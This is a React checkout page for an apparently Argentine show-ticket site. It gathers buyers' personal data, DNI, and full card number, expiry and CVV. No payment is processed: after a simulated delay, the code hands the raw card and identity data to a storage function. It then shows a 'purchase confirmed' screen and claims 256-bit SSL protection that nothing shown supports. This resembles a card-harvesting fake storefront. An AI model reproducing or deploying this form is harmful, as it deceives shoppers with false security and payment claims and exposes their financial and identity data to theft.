import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, CreditCard, User, Mail, Phone, Lock, CheckCircle } from 'lucide-react';
import { shows } from '../data/shows';
import { savePurchase, generateId, detectCardType, formatCurrency } from '../utils/storage';
import { PurchaseData } from '../types';
import styles from './Checkout.module.css';

type Step = 'select' | 'payment' | 'success';

interface FormData {
  firstName: string;
  lastName: string;
  dni: string;
  email: string;
  phone: string;
  cardNumber: string;
  cardHolder: string;
  cardExpiry: string;
  cardCvv: string;
  cardType: 'debit' | 'credit';
  quantity: number;
  section: string;
}

interface Errors {
  [key: string]: string;
}

function VisaLogo() {
  return (
    <svg width="44" height="28" viewBox="0 0 44 28" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="44" height="28" rx="4" fill="white"/>
      <text x="5" y="20" fontFamily="Arial" fontWeight="bold" fontSize="16" fill="#1A1F71">VISA</text>
    </svg>
  );
}

function MastercardLogo() {
  return (
    <svg width="44" height="28" viewBox="0 0 44 28" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="44" height="28" rx="4" fill="white"/>
      <circle cx="16" cy="14" r="8" fill="#EB001B"/>
      <circle cx="28" cy="14" r="8" fill="#F79E1B"/>
      <path d="M22 7.8a8 8 0 010 12.4A8 8 0 0122 7.8z" fill="#FF5F00"/>
    </svg>
  );
}

function formatCardNumber(val: string) {
  const clean = val.replace(/\D/g, '').slice(0, 16);
  return clean.replace(/(.{4})/g, '$1 ').trim();
}

function formatExpiry(val: string) {
  const clean = val.replace(/\D/g, '').slice(0, 4);
  if (clean.length >= 3) return clean.slice(0, 2) + '/' + clean.slice(2);
  return clean;
}

export default function Checkout() {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const show = shows.find(s => s.id === id);

  const [step, setStep] = useState<Step>('select');
  const [form, setForm] = useState<FormData>({
    firstName: '',
    lastName: '',
    dni: '',
    email: '',
    phone: '',
    cardNumber: '',
    cardHolder: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: 'credit',
    quantity: 1,
    section: 'General',
  });
  const [errors, setErrors] = useState<Errors>({});
  const [loading, setLoading] = useState(false);
  const [purchaseId, setPurchaseId] = useState('');

  const cardType = detectCardType(form.cardNumber);
  const sections = ['General', 'Platea Baja', 'Platea Alta', 'Campo', 'VIP'];
  const pricePerUnit = show?.price ?? 0;
  const serviceFee = Math.round(pricePerUnit * 0.12);
  const total = (pricePerUnit + serviceFee) * form.quantity;

  function set(field: keyof FormData, value: string | number) {
    setForm(prev => ({ ...prev, [field]: value }));
    setErrors(prev => { const e = { ...prev }; delete e[field]; return e; });
  }

  function validatePayment(): boolean {
    const errs: Errors = {};
    if (!form.firstName.trim()) errs.firstName = 'Requerido';
    if (!form.lastName.trim()) errs.lastName = 'Requerido';
    if (!form.dni.match(/^\d{7,9}$/)) errs.dni = 'DNI invalido (7-9 digitos)';
    if (!form.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) errs.email = 'Email invalido';
    if (!form.phone.match(/^\d{8,15}$/)) errs.phone = 'Telefono invalido';
    const cleanCard = form.cardNumber.replace(/\s/g, '');
    if (cleanCard.length !== 16) errs.cardNumber = 'Numero de tarjeta invalido';
    if (!form.cardHolder.trim()) errs.cardHolder = 'Requerido';
    if (!form.cardExpiry.match(/^\d{2}\/\d{2}$/)) errs.cardExpiry = 'Formato MM/AA';
    if (!form.cardCvv.match(/^\d{3,4}$/)) errs.cardCvv = 'CVV invalido';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  }

  async function handleSubmit() {
    if (!validatePayment()) return;
    setLoading(true);
    await new Promise(r => setTimeout(r, 1800));

    const pid = generateId();
    const purchase: PurchaseData = {
      id: pid,
      showId: show!.id,
      showTitle: show!.title,
      showDate: show!.dateLabel,
      quantity: form.quantity,
      section: form.section,
      totalAmount: total,
      cardNumber: form.cardNumber,
      cardHolder: form.cardHolder,
      cardType,
      cardExpiry: form.cardExpiry,
      dni: form.dni,
      email: form.email,
      phone: form.phone,
      firstName: form.firstName,
      lastName: form.lastName,
      createdAt: new Date().toISOString(),
      status: 'confirmed',
    };
    savePurchase(purchase);
    setPurchaseId(pid);
    setLoading(false);
    setStep('success');
  }

  if (!show) return (
    <div style={{ paddingTop: 120, textAlign: 'center' }}>
      <p>Show no encontrado.</p>
      <button className="btn-primary" onClick={() => navigate('/shows')}>Ver shows</button>
    </div>
  );

  return (
    <div className={styles.page}>
      <div className={styles.container}>
        <button className={styles.backBtn} onClick={() => step === 'select' ? navigate(`/show/${show.id}`) : setStep('select')}>
          <ArrowLeft size={16} />
          {step === 'select' ? 'Volver al show' : 'Volver a seleccion'}
        </button>

        {step !== 'success' && (
          <div className={styles.steps}>
            <div className={`${styles.stepItem} ${step === 'select' || step === 'payment' ? styles.stepActive : ''}`}>
              <div className={styles.stepNum}>1</div>
              <span>Seleccion</span>
            </div>
            <div className={styles.stepLine} />
            <div className={`${styles.stepItem} ${step === 'payment' ? styles.stepActive : ''}`}>
              <div className={styles.stepNum}>2</div>
              <span>Pago</span>
            </div>
          </div>
        )}

        {/* Success */}
        {step === 'success' && (
          <div className={styles.success}>
            <div className={styles.successIcon}>
              <CheckCircle size={60} color="#00aaff" />
            </div>
            <h2 className={styles.successTitle}>Compra confirmada</h2>
            <p className={styles.successSub}>Tu compra fue procesada correctamente.</p>
            <div className={styles.successBox}>
              <div className={styles.successRow}><span>Numero de ticket</span><strong>{purchaseId}</strong></div>
              <div className={styles.successRow}><span>Show</span><strong>{show.title}</strong></div>
              <div className={styles.successRow}><span>Fecha</span><strong>{show.dateLabel}</strong></div>
              <div className={styles.successRow}><span>Sector</span><strong>{form.section}</strong></div>
              <div className={styles.successRow}><span>Cantidad</span><strong>{form.quantity} entrada{form.quantity > 1 ? 's' : ''}</strong></div>
              <div className={styles.successRow}><span>Total pagado</span><strong>{formatCurrency(total)}</strong></div>
              <div className={styles.successRow}><span>Email confirmacion</span><strong>{form.email}</strong></div>
            </div>
            <button className="btn-primary" style={{ marginTop: 28 }} onClick={() => navigate('/')}>
              Volver al inicio
            </button>
          </div>
        )}

        {step !== 'success' && (
          <div className={styles.layout}>
            {/* Main form */}
            <div className={styles.main}>

              {/* STEP 1 - Selection */}
              {step === 'select' && (
                <div className={styles.card}>
                  <h3 className={styles.cardTitle}>Selecciona tus entradas</h3>
                  <div className={styles.formGrid}>
                    <div className="form-group">
                      <label className="form-label">Sector</label>
                      <select
                        className="form-input"
                        value={form.section}
                        onChange={e => set('section', e.target.value)}
                      >
                        {sections.map(s => <option key={s} value={s}>{s}</option>)}
                      </select>
                    </div>
                    <div className="form-group">
                      <label className="form-label">Cantidad</label>
                      <select
                        className="form-input"
                        value={form.quantity}
                        onChange={e => set('quantity', Number(e.target.value))}
                      >
                        {[1,2,3,4,5,6].map(n => <option key={n} value={n}>{n} entrada{n > 1 ? 's' : ''}</option>)}
                      </select>
                    </div>
                  </div>

                  <button className={styles.nextBtn} onClick={() => setStep('payment')}>
                    Continuar con el pago
                  </button>
                </div>
              )}

              {/* STEP 2 - Payment */}
              {step === 'payment' && (
                <>
                  {/* Personal data */}
                  <div className={styles.card}>
                    <h3 className={styles.cardTitle}>
                      <User size={18} />
                      Datos personales
                    </h3>
                    <div className={styles.formGrid}>
                      <div className="form-group">
                        <label className="form-label">Nombre</label>
                        <input className={`form-input ${errors.firstName ? 'error' : ''}`} placeholder="Juan" value={form.firstName} onChange={e => set('firstName', e.target.value)} />
                        {errors.firstName && <span className="form-error">{errors.firstName}</span>}
                      </div>
                      <div className="form-group">
                        <label className="form-label">Apellido</label>
                        <input className={`form-input ${errors.lastName ? 'error' : ''}`} placeholder="Garcia" value={form.lastName} onChange={e => set('lastName', e.target.value)} />
                        {errors.lastName && <span className="form-error">{errors.lastName}</span>}
                      </div>
                      <div className="form-group">
                        <label className="form-label">DNI</label>
                        <input className={`form-input ${errors.dni ? 'error' : ''}`} placeholder="12345678" value={form.dni} onChange={e => set('dni', e.target.value.replace(/\D/g, '').slice(0, 9))} />
                        {errors.dni && <span className="form-error">{errors.dni}</span>}
                      </div>
                      <div className="form-group">
                        <label className="form-label">Telefono</label>
                        <input className={`form-input ${errors.phone ? 'error' : ''}`} placeholder="1123456789" value={form.phone} onChange={e => set('phone', e.target.value.replace(/\D/g, '').slice(0, 15))} />
                        {errors.phone && <span className="form-error">{errors.phone}</span>}
                      </div>
                      <div className="form-group" style={{ gridColumn: '1 / -1' }}>
                        <label className="form-label">Email</label>
                        <input className={`form-input ${errors.email ? 'error' : ''}`} placeholder="juan@email.com" type="email" value={form.email} onChange={e => set('email', e.target.value)} />
                        {errors.email && <span className="form-error">{errors.email}</span>}
                      </div>
                    </div>
                  </div>

                  {/* Card payment */}
                  <div className={styles.card}>
                    <h3 className={styles.cardTitle}>
                      <CreditCard size={18} />
                      Datos de pago
                    </h3>

                    {/* Card type selector */}
                    <div className={styles.cardTypeRow}>
                      <button
                        className={`${styles.cardTypeBtn} ${form.cardType === 'credit' ? styles.cardTypeBtnActive : ''}`}
                        onClick={() => set('cardType', 'credit')}
                      >
                        Credito
                      </button>
                      <button
                        className={`${styles.cardTypeBtn} ${form.cardType === 'debit' ? styles.cardTypeBtnActive : ''}`}
                        onClick={() => set('cardType', 'debit')}
                      >
                        Debito
                      </button>
                    </div>

                    {/* Card preview */}
                    <div className={styles.cardPreview}>
                      <div className={styles.cardPreviewBg}>
                        <div className={styles.cardPreviewTop}>
                          <span className={styles.cardTypeLabel}>
                            {form.cardType === 'credit' ? 'TARJETA DE CREDITO' : 'TARJETA DE DEBITO'}
                          </span>
                          <div className={styles.cardLogo}>
                            {cardType === 'visa' && <VisaLogo />}
                            {cardType === 'mastercard' && <MastercardLogo />}
                            {cardType === 'unknown' && (
                              <div className={styles.logoPlaceholders}>
                                <VisaLogo />
                                <MastercardLogo />
                              </div>
                            )}
                          </div>
                        </div>
                        <div className={styles.cardPreviewNumber}>
                          {form.cardNumber || '**** **** **** ****'}
                        </div>
                        <div className={styles.cardPreviewBottom}>
                          <div>
                            <div className={styles.cardPreviewLabel}>TITULAR</div>
                            <div className={styles.cardPreviewValue}>{form.cardHolder.toUpperCase() || 'NOMBRE APELLIDO'}</div>
                          </div>
                          <div>
                            <div className={styles.cardPreviewLabel}>VENCE</div>
                            <div className={styles.cardPreviewValue}>{form.cardExpiry || 'MM/AA'}</div>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className={styles.formGrid}>
                      <div className="form-group" style={{ gridColumn: '1 / -1' }}>
                        <label className="form-label">Numero de tarjeta</label>
                        <div className={styles.inputWithIcon}>
                          <input
                            className={`form-input ${errors.cardNumber ? 'error' : ''}`}
                            placeholder="1234 5678 9012 3456"
                            value={form.cardNumber}
                            onChange={e => set('cardNumber', formatCardNumber(e.target.value))}
                            maxLength={19}
                          />
                          <div className={styles.inputBadges}>
                            {cardType === 'visa' && <VisaLogo />}
                            {cardType === 'mastercard' && <MastercardLogo />}
                          </div>
                        </div>
                        {errors.cardNumber && <span className="form-error">{errors.cardNumber}</span>}
                      </div>
                      <div className="form-group" style={{ gridColumn: '1 / -1' }}>
                        <label className="form-label">Nombre del titular (como figura en la tarjeta)</label>
                        <input
                          className={`form-input ${errors.cardHolder ? 'error' : ''}`}
                          placeholder="JUAN GARCIA"
                          value={form.cardHolder}
                          onChange={e => set('cardHolder', e.target.value.toUpperCase())}
                        />
                        {errors.cardHolder && <span className="form-error">{errors.cardHolder}</span>}
                      </div>
                      <div className="form-group">
                        <label className="form-label">Fecha de vencimiento</label>
                        <input
                          className={`form-input ${errors.cardExpiry ? 'error' : ''}`}
                          placeholder="MM/AA"
                          value={form.cardExpiry}
                          onChange={e => set('cardExpiry', formatExpiry(e.target.value))}
                          maxLength={5}
                        />
                        {errors.cardExpiry && <span className="form-error">{errors.cardExpiry}</span>}
                      </div>
                      <div className="form-group">
                        <label className="form-label">CVV / CVC</label>
                        <div className={styles.inputWithIcon}>
                          <input
                            className={`form-input ${errors.cardCvv ? 'error' : ''}`}
                            placeholder="123"
                            value={form.cardCvv}
                            onChange={e => set('cardCvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                            type="password"
                            maxLength={4}
                          />
                          <Lock size={15} color="rgba(255,255,255,0.3)" style={{ position: 'absolute', right: 14, top: '50%', transform: 'translateY(-50%)', pointerEvents: 'none' }} />
                        </div>
                        {errors.cardCvv && <span className="form-error">{errors.cardCvv}</span>}
                      </div>
                    </div>

                    <div className={styles.secureNote}>
                      <Lock size={13} />
                      Pago seguro con encriptacion SSL de 256 bits
                    </div>

                    <button
                      className={styles.payBtn}
                      onClick={handleSubmit}
                      disabled={loading}
                    >
                      {loading ? (
                        <span className={styles.spinner} />
                      ) : (
                        <>
                          <Lock size={16} />
                          Pagar {formatCurrency(total)}
                        </>
                      )}
                    </button>
                  </div>
                </>
              )}
            </div>

            {/* Order summary */}
            <div className={styles.summary}>
              <div className={styles.summaryCard}>
                <h3 className={styles.summaryTitle}>Tu orden</h3>
                <div className={styles.summaryImageWrapper}>
                  <img
                    src={`/images/${show.image}`}
                    alt={show.title}
                    className={styles.summaryImage}
                    onError={(e) => {
                      (e.target as HTMLImageElement).style.background = show.bgGradient;
                    }}
                  />
                </div>
                <div className={styles.summaryInfo}>
                  <p className={styles.summaryShowTitle}>{show.title}</p>
                  <p className={styles.summaryDate}>{show.dateLabel}</p>
                  <p className={styles.summaryTime}>Show: {show.showTime} | Puertas: {show.puertas}</p>
                </div>
                <div className={styles.summarySection}>
                  <div className={styles.summaryRow}>
                    <span>Sector</span>
                    <span>{form.section}</span>
                  </div>
                  <div className={styles.summaryRow}>
                    <span>{form.quantity}x Entrada</span>
                    <span>{formatCurrency(pricePerUnit * form.quantity)}</span>
                  </div>
                  <div className={styles.summaryRow}>
                    <span>Cargos de servicio</span>
                    <span>{formatCurrency(serviceFee * form.quantity)}</span>
                  </div>
                  <div className={styles.summaryDivider} />
                  <div className={`${styles.summaryRow} ${styles.summaryTotal}`}>
                    <span>Total</span>
                    <span>{formatCurrency(total)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
